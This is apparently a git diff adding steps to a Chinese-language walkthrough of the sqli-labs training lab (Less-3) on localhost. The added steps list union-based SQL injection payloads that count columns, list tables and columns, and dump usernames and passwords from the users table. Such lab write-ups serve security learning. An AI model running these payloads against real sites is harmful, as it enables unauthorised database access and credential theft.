@@ -64,8 +64,6 @@
 
 ![Less-1_4](./img/Less-1_4.png)
 
-
-
 ![Less-1_5](./img/Less-1_5.png)
 
 ![Less-1_6](./img/Less-1_6.png)
@@ -300,3 +298,68 @@ http://localhost/sqli-labs/Less-2/
 ~~~
 
 ![Less-3_3](./img/Less-3_3.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1') order by 4--+
+~~~
+
+![Less-3_4](./img/Less-3_4.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=-1') union select 1,2,3 --+
+~~~
+
+![Less-3_5](./img/Less-3_5.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=-1') union select 1,version(),database() --+
+~~~
+
+![Less-3_6](./img/Less-3_6.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
+~~~
+
+![Less-3_7](./img/Less-3_7.PNG)
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='user'--+
+~~~
+
+![Less-3_8](./img/Less-3_8.PNG)
+
+
+
++ 注入以下语句，成功爆破
+
+~~~ shell
+?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
+~~~
+
+![Less-3_9](./img/Less-3_9.PNG)
+
+
+
+# Less-4
+
